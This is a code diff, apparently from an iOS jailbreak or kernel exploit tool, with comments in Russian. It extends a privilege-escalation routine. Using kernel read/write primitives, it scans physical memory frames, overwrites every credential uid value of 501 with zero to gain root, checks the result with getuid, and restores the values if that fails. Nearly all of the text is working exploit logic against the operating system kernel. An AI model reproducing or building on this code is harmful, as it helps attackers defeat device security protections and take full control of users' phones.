@@ -2767,14 +2767,24 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                     }
                 }
             }
-            // пишем ВСЕ хиты на странице → 0, пробуем getuid + open системного файла
-            uint64_t saved[16]; int nSaved = 0;
-            uint64_t pageBase = firstHitVA - firstHitOff;
-            for (uint32_t o = 0; o + 8 <= 0x4000 && nSaved < 16; o += 8) {
-                uint64_t q = early_kread64(pageBase + o);
-                if (q == 0x000001f5000001f5ULL) {
-                    saved[nSaved++] = q;
-                    early_kwrite64(pageBase + o, 0);
+            // пишем ВСЕ хиты на ВСЕХ страницах → 0 (2.0.70)
+            uint64_t saved[64]; uint64_t savedVA[64]; int nSaved = 0;
+            // повторно обойдём 0x21 кадры и обнулим каждый 501-кластер
+            {
+                uint64_t wB3 = kconstant(physBase), wS3 = kconstant(physSize);
+                uint32_t f21 = 0;
+                for (uint64_t pa = wB3; pa < wB3 + wS3 && f21 < 400; pa += 0x4000) {
+                    if (kpFrameTypeOf(pa) != 0x21) continue;
+                    f21++;
+                    uint64_t al = phystokv(pa);
+                    if (!al) continue;
+                    for (uint32_t o = 0; o + 8 <= 0x4000 && nSaved < 64; o += 8) {
+                        uint64_t q = early_kread64(al + o);
+                        if (q == 0x000001f5000001f5ULL) {
+                            saved[nSaved] = q; savedVA[nSaved] = al + o; nSaved++;
+                            early_kwrite64(al + o, 0);
+                        }
+                    }
                 }
             }
             uint64_t r0 = early_kread64(firstHitVA);
@@ -2794,10 +2804,8 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             } else {
                 // restore все
                 int ri = 0;
-                for (uint32_t o = 0; o + 8 <= 0x4000 && ri < nSaved; o += 8) {
-                    if (early_kread64(pageBase + o) == 0) {
-                        early_kwrite64(pageBase + o, saved[ri++]);
-                    }
+                for (int i = 0; i < nSaved; i++) {
+                    early_kwrite64(savedVA[i], saved[i]); ri++;
                 }
                 kpNote(r, [NSString stringWithFormat:@"  [W501] restored %d — getuid не увидел 0", ri]);
             }
